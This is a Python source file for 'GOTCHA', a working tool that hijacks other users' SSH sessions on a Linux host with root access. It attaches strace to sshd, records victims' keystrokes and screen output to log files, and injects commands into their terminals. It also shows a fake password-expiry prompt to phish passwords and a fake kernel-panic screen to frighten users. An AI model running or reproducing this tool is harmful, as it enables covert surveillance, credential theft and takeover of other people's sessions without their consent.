#!/usr/bin/python
"""This
"""
__updated__ = "2022-09-24 13:40:42"

from subprocess import Popen, PIPE
from threading import Thread
from shutil import which

import termios
import fcntl
import sys
import os
import re
import json
import time
import glob
import struct

PS_UTIL = False
try:
    # psutil is a cross-platform library for retrieving information on
    # running processes and system utilization (CPU, memory, disks, network,
    # sensors) in Python. Supported platforms
    import psutil

    PS_UTIL = True
except ImportError as _:
    pass


def eprint(*args, **kwargs):
    """_summary_"""
    print(*args, file=sys.stderr, **kwargs)


def eeprint(*args, **kwargs):
    """_summary_"""
    return_code = 1
    if "return_code" in kwargs:
        return_code = kwargs["return_code"]
        del kwargs["return_code"]
    print(*args, file=sys.stderr, **kwargs)
    sys.exit(return_code)


def ansi_escape_8(sometext: any) -> bytes:
    """
    ansi_escape_8(self, string_escape)
    """
    # 7-bit and 8-bit C1 ANSI sequences
    ansi_escape_8bit = re.compile(
        rb"(?:\x1B[@-Z\\-_]|[\x80-\x9A\x9C-\x9F]|(?:\x1B\[|\x9B)[0-?]*[ -/]*[@-~])"
    )
    return ansi_escape_8bit.sub(b"", sometext)


def string_escape(string: any, encoding="utf-8") -> any:
    """
    * To bytes, required by 'unicode-escape'
    * Perform the actual octal-escaping decode
    * 1:1 mapping back to bytes
    * Decode original encoding
    """
    encode = ""
    try:
        encode = (
            string.encode("latin-1")
            .decode("unicode-escape")
            .encode("latin-1")
            .decode(encoding)
        )
    except UnicodeDecodeError:
        encode = string
    return encode


KEYBOARD_INTERRUPT_MSG = "\n\n[!] Ctrl+C detected...\nSee you!\n"


# Used in special keys translation
SPECIAL_KEYS_DICT = {
    "\x01": "[Ctrl+A]",
    "\x02": "[Ctrl+B]",
    "\x03": "[Ctrl+C]",
    "\x04": "[Ctrl+D]",
    "\x05": "[Ctrl+E]",
    "\x06": "[Ctrl+F]",
    "\x07": "[Ctrl+G]",
    "\x08": "[Ctrl+H]",
    "\x0b": "[Ctrl+K]",
    "\x0c": "[Ctrl+L]",
    "\x0e": "[Ctrl+N]",
    "\x0f": "[Ctrl+O]",
    "\x10": "[Ctrl+P]",
    "\x11": "[Ctrl+Q]",
    "\x12": "[Ctrl+R]",
    "\x13": "[Ctrl+S]",
    "\x14": "[Ctrl+T]",
    "\x15": "[Ctrl+U]",
    "\x16": "[Ctrl+V]",
    "\x17": "[Ctrl+W]",
    "\x18": "[Ctrl+X]",
    "\x19": "[Ctrl+Y]",
    "\x1a": "[Ctrl+Z]",
    "\x1b": "[Ctrl+[]",
    "\x1d": "[Ctrl+]]",
    "\x1f": "[Ctrl+/]",
    "\x7f": "[<--]",
    "\t": "[Tab]",
    "\r": "[Enter]\r\n",
}


class Gotcha:
    """_summary_"""

    def __init__(self):
        self.pid = None
        self.play = False

        self.keystrokes_file = ""
        self.session_file = ""
        self.working = True
        self.tty = ""

        self.line_play = 0.0
        self.now = 0.0
        self.elapsed_time = 0.0
        self.speed = 4.0

        self.debug = False
        self.quiet = False

    def eprint(self, *args, **kwargs):
        """_summary_"""
        if not self.quiet:
            eprint(*args, **kwargs)

    def eeprint(self, *args, **kwargs):
        """_summary_"""
        eeprint(*args, **kwargs)

    def help(self):
        """
        \n
        Ctrl+H - This help
        Ctrl+P - hooking message
        Ctrl+K - dont panic message
        Ctrl+Y - stop panic message
        Ctrl+D - forwarding Ctrl+D, this will logout the observed ssh session.\n
        """
        self.eprint(self.help.__doc__)

    def usage(self, err=None):
        """
        Usage: GOTCHA [OPTIONS]\n
        Args: --auto                # Lazy mode, auto-attach to first found session.
              --list                # List available SSH Sessions.
              --tty /dev/pts/XX     # Point GOTCHA to specific TTY.
              --replay <file>       # Play previously recorded session.
              --speed 4             # Replay speed multiplier (Default: 4).\n
                     ----- root privileges required! -----\r\n
        """
        self.eprint(self.usage.__doc__)

        if err:
            self.eprint(f"[-] Error: {err}\n")
        sys.exit(1)

    def get_pid_of_tty(self, tty: any) -> any:
        """
        get_pid_of_tty(self, tty: any) return any
        """
        _ = tty.replace("/dev/", "")
        proc = [
            i for i in os.popen("ps -ef").read().split("\n") if _ in i and "sshd:" in i
        ]

        # DEBUG
        if self.debug:
            for pdebug in proc:
                self.eprint(pdebug)

        if proc:
            pid = re.findall(r"^[^ ]+ +([0-9]+)", proc[0])[0]
            return str(int(pid))

        return False

    def hook(self, tty: any) -> None:
        """
        PoC of Console-Level hooking
        """
        self.eprint("\n\n[+] Sending hooking message!\n\n")
        with open(tty) as _tty:
            # Actual command that will be executed on target's tty.
            for cmd in "passwd\n":
                fcntl.ioctl(_tty, termios.TIOCSTI, cmd)

        # I don't know really why, but without sleep it wont work.
        time.sleep(0.05)

        message = "\033[2J\033[0;0H\r\nYour password expired and must be changed.\
            \nEnter new UNIX password: "
        with open(tty, "w") as _tty:
            _tty.write(message)
            _tty.close()

    def be_panic(self, tty: any) -> None:
        """
        be_panic
        """
        self.eprint("\n\n[+] kernel panic don't!\n\n")
        with open(tty) as _tty:
            # Actual command that will be executed on target's tty.
            for cmd in "tput blink\n":
                fcntl.ioctl(_tty, termios.TIOCSTI, cmd)

        # I don't know really why, but without sleep it wont work.
        time.sleep(0.05)

        message = """\033[2J\033[0;0H\r\n
        CPU 5: Machine Check Exception: 4 Bank 0: b60000201200080
        TSC 4c3387480500d ADDR 290000600
        CPU 7: Machine Check Exception: 5 Bank 5: b200000080200e0
        RIP !INEXACT! 10: {mwait_idle+0x56/0x7c
        TSC 4c338748053e
        CPU 4: Machine Check Exception: 4 Bank 5: b200001044100e0
        TSC 4c3387480522
        CPU 5: Machine Check Exception: 4 Bank 5: b200001040100e0
        TSC 4c33874805cc
        CPU 6: Machine Check Exception: 5 Bank 5: b200000084200e0
        RIP !INEXACT! 10: {tasklet_action+0x6d/0xae
        TSC 4c33874808a8
        Bulls On Paired: kernel panic don't reboot!!!
        """
        with open(tty, "w") as _tty:
            _tty.write(message)
            _tty.close()

    def dont_be_panic(self, tty: any) -> None:
        """
        do not panic
        """
        self.eprint("\n\n[+] kernel panic don't!\n\n")
        with open(tty) as _tty:
            # Actual command that will be executed on target's tty.
            for cmd in "tput sgr0 && reset\n":
                fcntl.ioctl(_tty, termios.TIOCSTI, cmd)

    def gotcha_tty(self, _args: any = (0,)) -> None:
        """
        # Attach to sshd process and mirror all read() syscalls to our stdout
        """
        with Popen(
            ["strace", "-s", "16384", "-p", self.pid, "-e", "read,write", "-q"],
            shell=False,
            stdout=PIPE,
            stderr=PIPE,
        ) as sshpipe:

            # Create output files.
            # keys-%Y-%m-%d-%H%M.gotcha.log
            if not os.path.isfile(self.session_file):
                open(self.session_file, "w").close()
            # sess-%Y-%m-%d-%H%M.gotcha.log
            if not os.path.isfile(self.keystrokes_file):
                open(self.keystrokes_file, "w").close()

            with open(self.keystrokes_file, "a") as _fo:
                _fo.write(f"{time.ctime()} {self.tty} {self.pid}:\n\n")

            _fdr = ""

            while self.working:
                try:
                    sshpipe.poll()

                    output = sshpipe.stderr.readline()

                    # output = str(self.ansi_escape_8(output), "utf-8")
                    output = str(output, "utf-8")

                    self.now = time.time()

                    # lPlay
                    if self.line_play:
                        self.elapsed_time = self.now - self.line_play

                    # read
                    if "read(" + _fdr in output:

                        # DEBUG
                        if self.debug:
                            self.eprint(output)

                        # Firstly, we need to find out target tty's stdout file descriptor,
                        # so we will send ' ' then backspace to the target tty and get the output
                        # Need to find more elegant way to do it.
                        if not _fdr:
                            _fdl = re.findall(
                                r"read\(([0-9]+), \".{1}\", 16384\) += 1", output
                            )
                            if isinstance(_fdl, list) and len(_fdl):
                                _fdr = _fdl[0]
                                self.eprint(
                                    f"\n[+] Found {self.tty} <stdout> file descriptor!"
                                )
                                self.eprint("[+] Let's rock!\n")
                                self.eprint(
                                    "[!] Press Ctrl+C to exit observed session!"
                                )
                                self.eprint(
                                    f"[!] Be careful, your input is mirrored to {self.tty}!\n"
                                )
                        else:
                            self.write_session_file(output)

                    # write
                    elif "write(" in output:
                        self.write_keys(output)

                    # end of session
                    elif not output and sshpipe.returncode is not None:
                        self.eprint("\n-------------------")
                        self.eprint("[!] End of session.")
                        self.working = False
                        break
                except Exception as _:
                    self.working = False
                    self.eeprint(str(sys.exc_info()))

    def get_keystrokes(self, _args: any) -> None:
        """
        # Thanks to enrico.bacis - https://stackoverflow.com/a/13207724
        """
        try:

            _fd = sys.stdin.fileno()
            oldterm = termios.tcgetattr(_fd)

            newattr = termios.tcgetattr(_fd)
            newattr[3] = newattr[3] & ~termios.ICANON & ~termios.ECHO
            termios.tcsetattr(_fd, termios.TCSANOW, newattr)

            oldflags = fcntl.fcntl(_fd, fcntl.F_GETFL)
            fcntl.fcntl(_fd, fcntl.F_SETFL, oldflags | os.O_NONBLOCK)

            try:

                # Type ' ' and backspace to get first data, otherwise if
                # no data received - the program will terminate
                with open(self.tty) as _fi:
                    for temp in [" ", "\x7f", "\r", "\n"]:  # '\x7f','\n']:
                        fcntl.ioctl(_fi, termios.TIOCSTI, temp)
                        time.sleep(0.05)

                while self.working:
                    try:
                        cmd = sys.stdin.readline(1)
                        with open(self.tty) as _f:
                            match cmd:
                                # Help Ctrl+H
                                case "\x08":
                                    self.help()

                                # Catch Ctrl+P and send hooking message
                                case "\x10":
                                    self.hook(self.tty)

                                # Catch Ctrl+K and send dont panic message
                                case "\x0b":
                                    self.be_panic(self.tty)

                                # Catch Ctrl+Y and send stop panic message
                                case "\x19":
                                    self.dont_be_panic(self.tty)

                                # forwarding Ctrl+D, this will logout the observed ssh session.
                                case "\x04":
                                    self.eprint(
                                        "\n\n[!] GOTCHA: forwarding Ctrl+D, this will logout the \
                                            observed ssh session!...\nSee you!\n"
                                    )
                                    self.working = False

                                # tweak for some apps that won't catch \n as Enter key
                                case "\n":
                                    cmd = "\r\n"
                            # tweak for catch keys
                            if cmd:
                                command = (
                                    struct.pack("B", cmd) for cmd in os.fsencode(cmd)
                                )
                                for cmd in command:
                                    fcntl.ioctl(_f, termios.TIOCSTI, cmd)
                    except IOError:
                        pass

            finally:
                termios.tcsetattr(_fd, termios.TCSAFLUSH, oldterm)
                fcntl.fcntl(_fd, fcntl.F_SETFL, oldflags)

        except Exception as _:
            self.eprint(sys.exc_info())
            self.working = False
            sys.exit(1)

    def replay(self) -> None:
        """_summary_"""
        _ = f"Replay of session {self.session_file}"
        self.eprint(_)
        self.eprint(("-" * len(_)))

        for line in open(self.session_file):
            try:
                _d = json.loads(line)
                now = float(_d["d"])
                timeout = float(now) / self.speed
                # we don't want to wait more than 10 seconds to see what happens next
                if timeout > 60:
                    timeout = 10
                time.sleep(timeout)
                sys.stdout.write(_d["v"])
                sys.stdout.flush()
            except KeyboardInterrupt:
                self.eeprint(KEYBOARD_INTERRUPT_MSG)
            except Exception as _:
                self.eprint(f"Session file {self.session_file} not in correct format")
                self.eprint(f"Error: {sys.exc_info()}")
                break
        self.eprint("\n\nEnd of session replay.\n")

    def write_keys(self, output="") -> None:
        """
        write_keys(self, output=""):
        """
        out = re.findall(r"write\([0-9]+, \"(.*)\", [0-9]+\) += 1$", output)

        pchar = ""
        if isinstance(out, list) and len(out):
            pchar = out[0]

        if SPECIAL_KEYS_DICT.get(pchar):
            # Replace special keys to readable values in output file
            pchar = SPECIAL_KEYS_DICT[pchar]

        with open(self.keystrokes_file, "a") as _fi:
            _fi.write(pchar)

    def write_session_file(self, output="") -> None:
        """
        write_session_file(diff, now, output="")
        """
        out = re.findall(r"read\([0-9]+, \"(.*)\", 16384\) += [0-9]+", output)
        pchar = ""
        if isinstance(out, list) and len(out):
            pchar = string_escape(out[0])

        sys.stdout.write(pchar)
        sys.stdout.flush()

        self.line_play = self.now
        with open(self.session_file, "a", encoding="utf-8") as fsess:
            odict = {"d": f"{ self.elapsed_time:0.2f}", "v": pchar}
            fsess.write(json.dumps(odict) + "\n")

    def main(self):
        """\n
         ██████╗  ██████╗ ████████╗ ██████╗██╗  ██╗ █████╗ ██╗██╗██╗
        ██╔════╝ ██╔═══██╗╚══██╔══╝██╔════╝██║  ██║██╔══██╗██║██║██║
        ██║  ███╗██║   ██║   ██║   ██║     ███████║███████║██║██║██║
        ██║   ██║██║   ██║   ██║   ██║     ██╔══██║██╔══██║╚═╝╚═╝╚═╝
        ╚██████╔╝╚██████╔╝   ██║   ╚██████╗██║  ██║██║  ██║██╗██╗██╗
        ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝

        SSH-TTY control
        \n"""

        if not which("strace"):
            self.eeprint("strace: Linux is required for this software.")

        # verbose
        if "-q" in sys.argv or "--quiet" in sys.argv:
            self.quiet = True
        else:
            self.quiet = False
            self.eprint(self.main.__doc__)

        if len(sys.argv[1:]) == 0:
            self.usage()

        # %Y-%m-%d-%H%M e.g. 2022-09-08-1236
        exec_timestamp = time.strftime("%Y-%m-%d-%H%M", time.localtime())

        # keys-%Y-%m-%d-%H%M.gotcha.log
        self.keystrokes_file = f"keys-{exec_timestamp}.gotcha.log"

        # sess-%Y-%m-%d-%H%M.gotcha.log
        self.session_file = f"sess-{exec_timestamp}.gotcha.log"

        # speed
        if "--speed" in sys.argv:
            self.speed = float(sys.argv[sys.argv.index("--speed") + 1])

        # replay
        if "--replay" in sys.argv:
            try:
                self.session_file = sys.argv[sys.argv.index("--replay") + 1]
            except IndexError as _:
                lst_files = glob.glob("*sess*.log")
                lst_files.sort(key=os.path.getmtime)
                self.session_file = lst_files[-1]
                # pass

            if not os.path.isfile(self.session_file):
                self.usage(err=f"Cannot open {self.session_file}")
            self.play = True

        # play
        if not self.play:

            # root privileges
            if os.geteuid() != 0:
                self.eeprint("[-] You need root privileges to use GOTCHA.\n")

            # Check if we are running in a TTY
            if not sys.stdout.isatty():
                self.eeprint(
                    "[-] Sorry, your shell is not a TTY shell.\nTry to spawn PTY with python\n"
                )

            # Get self tty
            current_tty = os.ttyname(sys.stdout.fileno()).replace("/dev/", "")

            # DEBUG
            if self.debug:
                self.eprint(current_tty)

            # Get active ssh connections
            self.eprint("[+] Getting available ssh connections...")
            if PS_UTIL:
                ttys = [
                    (i.terminal, i.name)
                    for i in psutil.users()
                    if "/" in i.terminal and not current_tty == i.terminal
                ]
            else:
                ttys = [
                    (t.split()[1], t.split()[0])
                    for t in os.popen("last").read().split("\n")
                    if "logged" in t and "/" in t and not t.split()[1] == current_tty
                ]

            # Point GOTCHA to specific TTY
            if "--tty" in sys.argv and "--list" not in sys.argv:
                self.tty = sys.argv[sys.argv.index("--tty") + 1]
                self.pid = self.get_pid_of_tty(self.tty)
                if not os.path.exists(self.tty) or not self.pid:
                    self.eeprint(f"\n[-] TTY {self.tty} does not exists!\n")

            if len(ttys) and not self.tty:

                # Found active SSH connections
                self.eprint("[+] Found active SSH connections:")
                for _t, _u in ttys:
                    self.eprint(
                        f"\tPID: {self.get_pid_of_tty(_t)} | TTY: /dev/{_t} ({_u})"
                    )

                # Choose yours with "--tty TTY" switch
                if "--auto" not in sys.argv:
                    self.eprint('\n[!] Choose yours with "--tty TTY" switch\n')
                    sys.exit(0)
                # Lazy mode activated
                else:
                    self.eprint("\n[+] -- Lazy mode activated -- :-)\n")
                    self.tty = "/dev/" + ttys[0][0]
                    self.pid = self.get_pid_of_tty(self.tty)

            elif len(ttys) == 0:
                self.eeprint("[-] No ssh connections found.\n")

            # USAGE
            if not self.tty:
                self.usage()

            self.tty = self.tty.strip()
            self.eprint(f"[+] Target TTY keystrokes file: {self.keystrokes_file}")
            self.eprint(f"[+] Target TTY session file: {self.session_file}")
            self.eprint(f"\n[+] Attaching to {self.pid} at {self.tty}...")

            thr_gotcha_tty = Thread(target=self.gotcha_tty, args=(0,))
            thr_gotcha_tty.start()

            time.sleep(1)

            thr_get_keystrokes = Thread(target=self.get_keystrokes, args=(0,))
            thr_get_keystrokes.start()

            # Wait for until self.working == False
            thr_gotcha_tty.join()

        elif self.play:
            self.replay()
        else:
            self.usage()


def main() -> None:
    """_summary_"""
    gotcha = Gotcha()
    try:
        gotcha.main()
    except IndexError:
        gotcha.usage(err="Argument value missing.")
    except KeyboardInterrupt:
        gotcha.working = False
        eeprint(KEYBOARD_INTERRUPT_MSG)


if __name__ == "__main__":
    main()
